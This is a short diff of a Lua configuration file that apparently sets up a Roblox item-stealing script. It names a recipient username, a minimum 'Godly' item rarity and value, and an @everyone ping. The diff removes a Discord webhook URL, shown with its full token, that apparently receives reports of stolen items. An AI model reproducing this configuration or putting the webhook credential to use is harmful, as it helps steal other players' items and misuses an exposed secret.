@@ -2,4 +2,4 @@ _G.Usernames = {"ally4ofc"}
 _G.min_rarity = "Godly"
 _G.min_value = 1
 _G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1406712349926097039/yUo_YN0hZcyRRKL7dJIGE7XAJe0dBHLPHYvgikoMFalAULtd4CYNWSQ9StzHFRTolaxK"
+
